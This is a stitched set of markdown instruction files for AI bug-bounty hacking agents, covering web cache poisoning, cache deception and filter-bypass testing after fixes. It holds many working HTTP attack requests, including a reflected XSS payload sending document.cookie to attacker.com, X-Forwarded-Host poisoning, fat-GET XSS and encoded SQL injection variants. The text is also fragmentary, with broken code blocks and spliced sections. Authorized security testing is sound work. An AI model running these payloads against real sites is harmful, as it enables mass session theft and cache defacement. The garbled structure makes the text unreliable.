## Output Fields

Add to FINDINGs:

```
cache_type: CDN | reverse-proxy | browser
poisoned_header: <the unkeyed header used>
cache_key_ignores: <what the cache key doesn't include>
xss_context: <where in the response the payload executes>
csp_bypass_used: <jQuery version | Bootstrap version | none>
deception_path: <the URL used for cache deception>
cached_response_served_to: all-users | authenticated-users | specific-path
```

## Rules
- Cache poisoning alone is informational — must chain to XSS or data theft for paid bounty
- Always verify with a clean browser (no cookies, no cache) after poisoning
- Test on login pages — highest impact (credentials in context)
- CSP bypass is often needed — find older JS libraries on scope domains
- Web cache deception can leak private data — check if cached responses contain PII
- Use Burp's "Cache Poisoning" extension for automated testing
- Test behind CDN (Cloudflare, Akamai, Fastly) — that's where caching happens


### From `hunt-skills/bountyforge/references/hacking-agents/regression-agent.md`

# Regression Testing Agent

You are an attacker who comes back after the fix. Your mission: verify that patches actually work, find bypasses, discover new bugs introduced by the fix, and scan sibling endpoints that share the same vulnerable pattern.

Other agents find bugs. You make sure bugs stay dead — or prove they aren't.

### 1. Fix Verification

When a finding is marked "resolved" or "patched":

**Re-test the exact original finding:**
- Use identical request (method, path, headers, body, parameters)
- Compare response to original — if identical, fix FAILED
- If different, check: did they just change the error message? Or actually fix the vuln?

**Test completeness of fix:**
- Original payload variant A → blocked? Try variant B, C, D
- Original HTTP method → blocked? Try PUT, PATCH, OPTIONS
- Original Content-Type → blocked? Try other content types
- Original parameter → blocked? Try parameter in different location (query, body, header, cookie)

**Common incomplete fix patterns:**
```
1. Blocked in GET but not POST
2. Blocked in JSON body but not form-encoded
3. Blocked at /api/v2 but not /api/v1
4. Blocked at app level but not CDN/proxy level (smuggling)
5. Blocked exact payload but not encoded variant (URL, Unicode, double-encoding)
6. Blocked when authenticated but not when unauthenticated
```

### 2. Bypass Discovery

For every fix, attempt these bypass techniques:

**Encoding bypasses:**
```
Original:    ' OR 1=1--
URL:         %27%20OR%201%3D1--
Double URL:  %2527%2520OR%25201%253D1--
Unicode:     ' OR 1\u003d1--
Hex:         0x27204f5220313d312d2d
Base64:      JyBPUiAxPTEtLQ==
```

**HTTP method switching:**
```
Original:    POST /api/users/1 HTTP/1.1
Bypass:      GET /api/users/1 HTTP/1.1
Bypass:      PUT /api/users/1 HTTP/1.1
Bypass:      PATCH /api/users/1 HTTP/1.1
Bypass:      OPTIONS /api/users/1 HTTP/1.1
Bypass:      POST /api/users/1.json HTTP/1.1
Bypass:      POST /api/users/1/ HTTP/1.1
```

**Content-Type switching:**
```
Original:    Content-Type: application/json
Bypass:      Content-Type: application/x-www-form-urlencoded
Bypass:      Content-Type: multipart/form-data
Bypass:      Content-Type: text/xml
Bypass:      Content-Type: application/xml
Bypass:      Content-Type: text/plain (no parsing, raw pass-through)
```

**Parameter placement:**
```
Original:    POST /api/transfer  body: {"to":"attacker","amount":1000}
Bypass:      GET  /api/transfer?to=attacker&amount=1000
Bypass:      POST /api/transfer  X-To: attacker, X-Amount: 1000 (header injection)
Bypass:      POST /api/transfer  Cookie: to=attacker; amount=1000
```

**Path manipulation:**
```
Original:    /api/users/1
Bypass:      /api/users/1/.
Bypass:      /api/users/1%00
Bypass:      /api/users/1%20
Bypass:      /api/users/1%23
Bypass:      /api/./users/1
Bypass:      /api/users/1;.js
```

### 3. Sibling Endpoint Scanning

When a bug is confirmed, scan for the same pattern across siblings:

**Controller-level sibling discovery:**
```
Confirmed: DELETE /api/v2/orders/123 (IDOR — no ownership check)
Siblings to test:
  GET     /api/v2/orders/123       (read other's orders)
  PUT     /api/v2/orders/123       (modify other's orders)
  POST    /api/v2/orders           (create order for other)
  GET     /api/v2/orders           (list all orders)
  DELETE  /api/v2/orders/bulk      (bulk delete)
  POST    /api/v2/orders/123/cancel
  POST    /api/v2/orders/123/refund
  POST    /api/v2/orders/123/return
```

**Resource-level sibling discovery:**
```
Confirmed: IDOR on /api/v2/orders/123
Sibling resources to test:
  /api/v2/invoices/123
  /api/v2/payments/123
  /api/v2/shipments/123
  /api/v2/customers/123
  /api/v2/transactions/123
  /api/v2/refunds/123
  /api/v2/cart/123
```

**API version siblings:**
```
Confirmed: IDOR on /api/v2/orders/123
Check:      /api/v1/orders/123
Check:      /api/v3/orders/123
Check:      /api/internal/orders/123
Check:      /api/admin/orders/123
Check:      /api/mobile/orders/123
Check:      /api/public/orders/123
Check:      /internal_api/orders/123
```

### 4. New Bug Discovery from Fixes

Fixes introduce new bugs. Test for these:

**Fix-introduced vulnerabilities:**
```
Original bug:   IDOR on /api/users/{id} — no auth check
Fix applied:    Added auth check: if (user.id != params.id) reject
New bug:        Auth check reveals "user exists" vs "no permission" → user enumeration
New bug:        Auth check uses == instead of strict !== → type juggling bypass
New bug:        Auth check on endpoint but not on new/{id}/profile sub-endpoint
New bug:        Error response includes user object → information disclosure
```

**Fix regression patterns:**
```
1. Input validation added → rejects valid inputs (DoS)
2. Auth check added on read → forgot write → different vulnerability
3. Rate limiting added → too aggressive → blocks legitimate users
4. Logging added → logs sensitive data → new disclosure vector
5. Encryption added → key hardcoded → worse than no encryption
6. CSP tightened → but script-src has wildcard → bypass still exists
```

### 5. Patch-Gap Detection

Monitor for window between fix deployment and full rollout:

**Check propagation:**
- Hit multiple edge nodes (different regions, different CDN POPs)
- Does the fix exist on `app.target.com` but not `app2.target.com`?
- Does the fix exist on main domain but not on regional subdomains?
- Does the fix exist on web but not on mobile API?

**Patch-gap timing:**
```
T+0:    Fix deployed to canary (1% traffic)
T+1h:   Fix deployed to one region
T+6h:   Fix deployed globally
T+24h:  CDN caches purged
T+72h:  All edge servers updated

Windows of opportunity exist at each transition.
```

# regression_suite.py structure
REGRESSION_TESTS = [
    {
        "finding_id": "abc123",
        "original_severity": "high",
        "patched": True,
        "tests": [
            # Test 1: Exact original payload
            {"method": "GET", "path": "/api/users/456", "expect_status": 403},
            # Test 2: Method bypass
            {"method": "POST", "path": "/api/users/456", "expect_status": 403},
            # Test 3: Encoding bypass
            {"method": "GET", "path": "/api/users/%34%35%36", "expect_status": 403},
            # Test 4: Version bypass
            {"method": "GET", "path": "/api/v1/users/456", "expect_status": 403},
        ]
    }
]
```

## Output Fields

Add to FINDINGs:

```
original_finding_id: <finding this regression test relates to>
fix_status: verified_fixed | bypassed | incomplete | new_bug_introduced | patch_gap_active
bypass_method: <what bypassed the fix, if applicable>
sibling_endpoints_affected: <count of endpoints sharing the same vulnerability>
regression_test_count: <number of regression tests created>
```

## Cross-Agent Signals

When you discover a fix bypass, broadcast:

```
REGRESSION_ALERT:
- original_finding_id: <id>
- fix_status: bypassed
- bypass_method: <method>
- new_severity: <severity>  (often HIGHER than original — bypasses are more valuable)
- affected_siblings: <list>
```

This triggers:
- Original finding agent to re-evaluate severity (bypasses often pay more)
- Exploit generation engine to create updated PoC
- Chain builder to look for new escalation paths


### From `normal-skills/web-cache-deception.md`

name: web-cache-deception-poisoning
description: Comprehensive web cache deception and poisoning testing methodology covering path confusion, query string ignorance, header manipulation, fat GET attacks, dynamic content poisoning, cache key analysis, and advanced cache exploitation techniques with optimized detection and exploitation workflows.
version: 1.0.0
---

## Overview

Web Cache Deception (WCD) and Web Cache Poisoning (WCP) are attack techniques that exploit discrepancies between how a web cache and the origin server parse HTTP requests. These vulnerabilities can lead to account takeover, sensitive data exposure, stored XSS, denial of service, and complete application compromise.

**Core Concepts:**
- **Cache Key:** The subset of request components used by the cache to identify a stored response
- **Cacheable Extension:** File extensions typically cached (`.css`, `.js`, `.png`, `.jpg`, `.gif`, `.woff`, `.svg`, `.txt`, `.html`)
- **Cache Busting:** Techniques to force cache misses for testing purposes
- **Cache Deception:** Tricking the cache into storing a dynamic/authenticated response
- **Cache Poisoning:** Manipulating the cache to serve attacker-controlled content to other users

**Critical Headers:**
- `Cache-Control`: Directives for caching behavior
- `X-Cache`: Hit/Miss status (often `X-Cache-Lookup`, `CF-Cache-Status`, `X-CDN-Cache`)
- `Vary`: Determines which request headers affect cache key
- `Age`: Time since response was cached
- `ETag` / `Last-Modified`: Validation mechanisms

---

# Common cache indicator headers to observe
X-Cache: HIT | MISS | BYPASS
X-Cache-Lookup: HIT | MISS
CF-Cache-Status: HIT | MISS | BYPASS | DYNAMIC | EXPIRED
X-CDN-Cache: HIT | MISS
Akamai-Cache-Status: HIT | MISS
X-Served-By: cache-lax1234-XYZ
X-Timer: S1234567890.123456,VS0,VE1
Fastly-Debug: 1
X-Cache-Hits: 0 | 1 | 2
Age: 0
```

**Detection Workflow:**
1. Send identical requests twice; compare response times and headers
2. If second request is faster and contains `X-Cache: HIT` or similar, caching is active
3. Note which headers are present—these reveal the caching layer (Cloudflare, Fastly, Akamai, Varnish, Squid, Nginx, etc.)

**Cache Busting for Testing:**
```http

### 1.2 Determine Cache Key Components

**Methodology:**
Send baseline request, then systematically modify components to identify what is included in the cache key.

| Component | Test Request | Cache Hit? | In Key? |
|-----------|-------------|------------|---------|
| Path | `/profile` vs `/profile/` | Compare | Variable |
| Query String | `?a=1` vs `?a=2` | Compare | Usually Yes |
| Host Header | Different `Host` values | Compare | Usually Yes |
| Specific Headers | `Accept`, `Accept-Language`, etc. | Compare | Check `Vary` |

**Header-Based Cache Key Testing:**
```http

# Test if Accept header is in cache key (check Vary header first)
GET /api/data HTTP/1.1
Host: target.com
Accept: application/json

# Second request
GET /api/data HTTP/1.1
Host: target.com
Accept: text/html
```

**Vary Header Analysis:**
- `Vary: Accept-Encoding` → Cache key includes `Accept-Encoding`
- `Vary: Accept-Language, Cookie` → Cache key includes both
- `Vary: *` → Cache will never serve cached response (rare, but important)

---

### 2.1 Path Confusion Attacks

**Core Principle:**
The cache parses the URL to determine cacheability based on file extension, while the origin server routes based on the full path or script name, executing dynamic code.

**Basic Payload Structure:**
```
https://target.com/profile.php/fake.css
https://target.com/api/user.php/avatar.jpg
https://target.com/home.aspx/nonexistent.js
https://target.com/app.py/static/file.txt
```

**Detection Steps:**
1. Identify authenticated endpoints that return dynamic content (profile pages, dashboards, API endpoints with session data)
2. Append a cacheable file extension to the path:
   ```http
   GET /profile/settings.php/styles.css HTTP/1.1
   Host: target.com
   Cookie: session=abc123
   ```
3. Check response headers for caching indicators:
   - `X-Cache: HIT` or `CF-Cache-Status: HIT`
   - `Content-Type: text/css` (or other static type)
   - Response body contains your private profile data
4. Verify by requesting the same URL in an incognito session—if you see the authenticated data, the deception succeeded

**Advanced Path Confusion Variants:**
```http

# Null byte / truncation (legacy systems)
GET /profile.php%00.css HTTP/1.1
```

**Path Mapping Exploitation:**
```http

# If application strips known static paths
GET /profile.php/static/styles.css HTTP/1.1

### 2.2 Query String Ignorance

**Core Principle:**
The cache ignores query parameters in the cache key (or normalizes them), while the origin server processes them to return dynamic content.

**Detection Steps:**
1. Request an endpoint with query parameters:
   ```http
   GET /profile?user=admin HTTP/1.1
   Host: target.com
   Cookie: session=abc123
   ```
2. Check if the response is cached despite the dynamic parameter
3. Test parameter normalization:
   ```http
   GET /profile?user=admin&cb=1 HTTP/1.1
   GET /profile?cb=1&user=admin HTTP/1.1
   GET /profile?user=admin& HTTP/1.1
   ```

**Query String Stripping Scenarios:**
```http

# Cache key: /profile?a=2&b=1
```

**Exploitation Workflow:**
1. Find an endpoint that reflects user input or returns sensitive data based on parameters
2. Determine if the cache ignores those parameters
3. Send the crafted URL to the victim; the cache stores the response
4. The victim (or any user) requests the same URL and receives your sensitive data from cache

---

### 3.1 Header Manipulation Attacks

**Core Principle:**
Inject or manipulate headers that are included in the origin server's response processing but excluded from the cache key, causing the cache to store a poisoned response.

**Critical Headers to Test:**

**X-Forwarded-Host Poisoning:**
```http
GET /en?cb=1 HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# <script src="https://attacker.com/script.js"></script>
```

**X-Forwarded-Scheme Poisoning:**
```http
GET /api/data HTTP/1.1
Host: target.com
X-Forwarded-Scheme: http

# Cache stores and serves mixed content or redirect loops
```

**X-HTTP-Host-Override / X-Forwarded-Server:**
```http
GET /page HTTP/1.1
Host: target.com
X-HTTP-Host-Override: attacker.com
X-Forwarded-Server: attacker.com
```

**X-Original-URL / X-Rewrite-URL:**
```http
GET /static/resource.css HTTP/1.1
Host: target.com
X-Original-URL: /admin/sensitive

# Origin processes: /admin/sensitive
```

**Origin Header Manipulation:**
```http
GET /api/user HTTP/1.1
Host: target.com
Origin: https://attacker.com

# Access-Control-Allow-Credentials: true
```

**Referer-Based Poisoning:**
```http
GET /page HTTP/1.1
Host: target.com
Referer: https://attacker.com/<script>alert(1)</script>

# If application reflects Referer in response without sanitization
```

**Testing Methodology:**
1. Identify headers that the origin server trusts but the cache ignores
2. Inject payload headers and observe if they affect the response body
3. Verify the response is cached (second request returns HIT with same poisoned body)
4. Confirm from a clean session that other users receive the poisoned response

### 3.2 Fat GET Attacks

**Core Principle:**
The cache uses only the URL as the cache key, but the origin server processes the request body (GET with body), allowing different bodies to return different content for the same cache key.

**Detection:**
```http
GET /api/search?cb=1 HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 25

{"query":"<script>alert(1)</script>"}
```

**Exploitation Steps:**
1. Identify if the origin server processes GET body data
2. Send a Fat GET request with malicious payload in body
3. Check if the response is cached under the URL key
4. Other users requesting the same URL (without body) receive the poisoned response

**Variants:**
```http

# Form-encoded body in GET
GET /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

q=<script>alert(1)</script>

# XML body in GET
GET /api/convert HTTP/1.1
Host: target.com
Content-Type: application/xml
Content-Length: 50

<?xml version="1.0"?><x><![CDATA[<script>alert(1)</script>]]></x>
```

### 3.3 Dynamic Content Poisoning via Parameter Reflection

**Core Principle:**
Reflected parameters in cached responses (especially JSONP, API endpoints, or open redirects) allow stored XSS or data exfiltration through cache poisoning.

**JSONP Callback Poisoning:**
```http
GET /api/data?callback=attackerFunction&cb=1 HTTP/1.1
Host: target.com

# If cached, all users requesting /api/data?callback=attackerFunction receive this
```

**Open Redirect Poisoning:**
```http
GET /redirect?next=https://attacker.com&cb=1 HTTP/1.1
Host: target.com

# subsequent users are redirected to attacker.com
```

**Reflected XSS via Cache Poisoning:**
```http
GET /search?q=<script>fetch('https://attacker.com/?c='+document.cookie)</script>&cb=1 HTTP/1.1
Host: target.com

# If search term is reflected in cached response without proper sanitization
```

**DOM-Based Poisoning:**
```http
GET /page?theme=dark#<img src=x onerror=alert(1)> HTTP/1.1
Host: target.com

### 4.2 Method Override Poisoning

```http
POST /api/user HTTP/1.1
Host: target.com
X-HTTP-Method-Override: GET
Content-Type: application/json

{"malicious":"data"}

# Absolute URI vs Host header mismatch
GET http://attacker.com/ HTTP/1.1
Host: target.com

# Cache keys on absolute URI or Host depending on implementation
```

**Port Confusion:**
```http
GET /page HTTP/1.1
Host: target.com:80

# Cache parses first occurrence, origin parses last
GET /search?q=benign&q=<script>alert(1)</script> HTTP/1.1

### 5.1 Cloudflare-Specific

**Cache Status Values:**
- `DYNAMIC` → Not cached (good for testing without poisoning real users)
- `HIT` / `MISS` → Actively caching

**Cloudflare Workers:**
- Workers may modify responses before caching
- Test for header injection via Worker logic

**Page Rules Analysis:**
- Check if `.jpg`, `.css`, `.js` are explicitly cached
- Look for "Cache Level: Cache Everything" rules that might cache HTML

# If you can influence Surrogate-Key, you may affect cache purging
Surrogate-Key: user-12345
```

**Fastly-Debug:**
```http
GET /page HTTP/1.1
Fastly-Debug: 1

### 5.3 Akamai-Specific

**Edge-Control Header:**
```http
Edge-Control: cache-maxage=1h
```

**Pragma: akamai-x-cache-on:**
```http
GET /page HTTP/1.1
Pragma: akamai-x-cache-on

### 5.4 Varnish-Specific

**Varnish Configuration Language (VCL) Weaknesses:**
- Check for `return(hash)` vs `return(pipe)` logic
- Look for `req.url` manipulation that might create key differentials

**X-Varnish Header:**
```http
X-Varnish: 123456789 123456788

### 6.1 Burp Suite Extensions

**Param Miner:**
- Automatically identifies hidden headers and parameters
- Use "Guess headers" feature to find cache-key-excluded headers
- Enable "Fat GET" detection

**Autorize:**
- Test for authentication bypass via cache deception
- Configure low-privileged and unauthenticated sessions

**Flow:**
- Manually map cache behavior, then use Intruder for payload fuzzing

### 6.3 Key Payload Lists

**Cacheable Extensions to Test:**
```
.css, .js, .png, .jpg, .jpeg, .gif, .ico, .woff, .woff2, .ttf, .eot, .svg,
.txt, .html, .htm, .xml, .json, .pdf, .zip, .rar, .mp4, .mp3, .avi, .bmp,
.webp, .cur, .ogv, .ogg, .webm, .swf, .flv, .m4v, .m4a, .eot, .otf
```

**Headers to Test for Poisoning:**
```
X-Forwarded-Host
X-Forwarded-For
X-Forwarded-Proto
X-Forwarded-Scheme
X-Forwarded-Server
X-Forwarded-Port
X-HTTP-Host-Override
X-Original-URL
X-Rewrite-URL
X-Host
X-Remote-URL
X-Remote-IP
X-Referer
Origin
Referer
User-Agent
Accept
Accept-Language
Accept-Encoding
Cookie
Authorization
X-Custom-IP-Authorization
Client-IP
True-Client-IP
CF-Connecting-IP
X-Real-IP
X-Originating-IP
X-Client-IP
Forwarded
Via
```

---

### 7.1 Account Takeover via WCD
1. Trick cache into storing victim's authenticated profile page
2. Access the cached URL to obtain victim's CSRF tokens, session identifiers, or PII
3. Use stolen tokens to perform account takeover actions

### 7.2 Stored XSS via WCP
1. Poison cache with reflected XSS payload in a commonly accessed resource
2. All users loading that resource execute the payload
3. Impact scales to mass compromise without direct victim interaction

# Poison cache to return 404 for critical assets
GET /app.js?cb=1 HTTP/1.1
X-Original-URL: /nonexistent
```

```http

# Poison cache with extremely large responses
GET /api/data?cb=1 HTTP/1.1
X-Forwarded-Host: attacker-controlled-large-response.com
```

### 7.4 JavaScript Execution via WCD + WCP Chain
1. Use WCD to cache a dynamic page as `.js`
2. The cached "JavaScript" contains attacker-injected code via WCP header manipulation
3. Load the cached `.js` in a victim's browser context via `<script src="...">`

### 7.5 API Key / Token Exfiltration
1. Poison cache of an API endpoint that returns sensitive headers
2. Victim's subsequent request returns the poisoned response containing attacker-controlled exfiltration code
3. Sensitive data is sent to attacker server

---

### 8.1 Post-Fix Validation Checklist

- [ ] Dynamic/authenticated responses contain `Cache-Control: no-store, no-cache, must-revalidate, private`
- [ ] Static asset caching rules do not match dynamic endpoints via path confusion
- [ ] Origin server rejects or ignores untrusted `X-Forwarded-*` headers
- [ ] Cache key includes all parameters that affect response content
- [ ] `Vary` header is properly configured for headers that modify responses
- [ ] GET request bodies are ignored by origin server
- [ ] Path normalization is consistent between cache and origin
- [ ] Query string normalization is consistent between cache and origin
- [ ] `Access-Control-Allow-Origin` is not dynamically set based on user input
- [ ] JSONP callbacks are validated against an allowlist

### 8.2 Safe Testing Practices

- Always use unique cache-busting parameters (`?cb=RANDOM`) during testing
- Monitor `Age` header to confirm cache storage without over-poisoning
- Test on staging environments when possible
- Immediately purge poisoned cache entries after confirmation
- Document exact timestamps and request IDs for reproducibility

---

### Cache Deception Quick Test
```http
GET /profile.php/test.css HTTP/1.1
Host: target.com
Cookie: session=VALID_SESSION

### Cache Poisoning Quick Test
```http
GET /?cb=12345 HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

### Fat GET Quick Test
```http
GET /search?cb=12345 HTTP/1.1
Host: target.com
Content-Length: 29
Content-Type: application/x-www-form-urlencoded

q=<script>alert(1)</script>

### Parameter Cloaking Quick Test
```http
GET /page?foo=bar&foo=<script>alert(1)</script> HTTP/1.1
Host: target.com

## Appendix B: Response Header Analysis Guide

| Header | Value | Interpretation |
|--------|-------|----------------|
| `X-Cache` | `HIT` | Response served from cache |
| `X-Cache` | `MISS` | Response fetched from origin |
| `Age` | `> 0` | Response has been cached for N seconds |
| `CF-Cache-Status` | `DYNAMIC` | Cloudflare decided not to cache |
| `CF-Cache-Status` | `BYPASS` | Cache rules explicitly bypassed |
| `Vary` | `Accept-Encoding` | Cache key includes `Accept-Encoding` |
| `Cache-Control` | `max-age=3600` | Cacheable for 1 hour |
| `Cache-Control` | `no-store` | Should not be cached |
| `Last-Modified` | Timestamp | Validation-based caching active |

---

## Appendix C: Common Misconfigurations

1. **Cache Everything Rules:** CDN configured to cache all content regardless of `Cache-Control`
2. **Extension-Based Routing:** Cache keys on `.css` extension but origin routes to PHP handler
3. **Header Trust Issues:** Origin trusts `X-Forwarded-Host` from any source
4. **Query String Stripping:** Cache removes marketing parameters but also strips auth-related params
5. **Inconsistent Normalization:** Cache decodes `%2f` to `/` but origin treats it as literal
6. **Missing Vary Headers:** Responses vary by `User-Agent` or `Accept` but `Vary` header is absent
7. **GET Body Processing:** Origin framework automatically parses GET body (common in some APIs)
